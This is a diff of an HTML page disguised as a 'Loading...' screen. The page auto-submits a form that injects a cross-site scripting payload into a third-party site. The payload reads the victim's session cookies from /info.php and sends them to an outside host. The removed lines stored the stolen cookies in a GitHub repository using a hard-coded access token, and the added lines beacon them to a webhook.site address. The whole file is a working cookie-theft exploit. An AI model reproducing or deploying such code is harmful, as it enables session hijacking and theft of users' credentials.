@@ -1,7 +1,9 @@
 <html>
 <head><title>Loading...</title></head>
 <body>
-<p style="text-align:center;font-family:sans-serif">جاري التحميل...</p>
+<p id="status" style="text-align:center;font-family:sans-serif">
+  جاري التحميل...
+</p>
 
 <form id="myForm" method="post"
   action="https://kingtelecom.info/?do=alltransclient">
@@ -10,57 +12,24 @@
 </form>
 
 <script>
-var T = "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";
-var A = "https://api.github.com/repos/hix911/R_hix9/contents/cookies.txt";
-var H = {
-  "Authorization": "token " + T,
-  "Content-Type":  "application/json",
-  "Accept":        "application/vnd.github.v3+json"
-};
+var SERVER = "https://webhook.site/fe1a8020-bd8f-4fdf-a75f-9791b130c10b";
 
-function save(c) {
-  fetch(A, { headers: H })
-  .then(function(r) { return r.json() })
-  .then(function(d) {
-    var old = d.content ? atob(d.content.replace(/\n/g, '')) : '';
-    var txt = old
-      + "\n=====================================\n"
-      + "TIME: " + new Date().toISOString() + "\n"
-      + "COOKIES:\n" + c + "\n"
-      + "=====================================\n";
-    var body = {
-      message: "update",
-      content: btoa(unescape(encodeURIComponent(txt)))
-    };
-    if (d.sha) body.sha = d.sha;
-    return fetch(A, {
-      method:  "PUT",
-      headers: H,
-      body:    JSON.stringify(body)
-    });
-  });
-}
+// الخطوة 1: تأكيد وصول steal.php
+new Image().src = SERVER + "?c=EXPLOIT_LOADED";
 
 var xss = [
   '">',
   '<img src=x onerror="',
-  "var T='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';",
-  "var A='https://api.github.com/repos/hix911/R_hix9/contents/cookies.txt';",
-  "var H={'Authorization':'token '+T,'Content-Type':'application/json','Accept':'application/vnd.github.v3+json'};",
   "fetch('/info.php',{credentials:'include'})",
   ".then(function(r){return r.text()})",
   ".then(function(h){",
   "var idx=h.indexOf('HTTP_COOKIE');",
-  "var c=h.substring(idx,idx+500).replace(/\\x3C[^\\x3E]+\\x3E/g,'');",
-  "fetch(A,{headers:H})",
-  ".then(function(r){return r.json()})",
-  ".then(function(d){",
-  "var old=d.content?atob(d.content.replace(/\\n/g,'')):' ';",
-  "var txt=old+'\\n=====\\n'+new Date().toISOString()+'\\n'+c+'\\n=====\\n';",
-  "var body={message:'u',content:btoa(unescape(encodeURIComponent(txt)))};",
-  "if(d.sha)body.sha=d.sha;",
-  "fetch(A,{method:'PUT',headers:H,body:JSON.stringify(body)});",
+  "var c=h.substring(idx,idx+500)",
+  ".replace(/\\x3C[^\\x3E]+\\x3E/g,'');",
+  "new Image().src='" + SERVER + "?c='+encodeURIComponent(c)",
   "})",
+  ".catch(function(e){",
+  "new Image().src='" + SERVER + "?c=ERROR_'+encodeURIComponent(e)",
   "})",
   '">'
 ].join('');
@@ -68,5 +37,6 @@ var xss = [
 document.getElementById('payload').value = xss;
 document.getElementById('myForm').submit();
 </script>
+
 </body>
 </html>
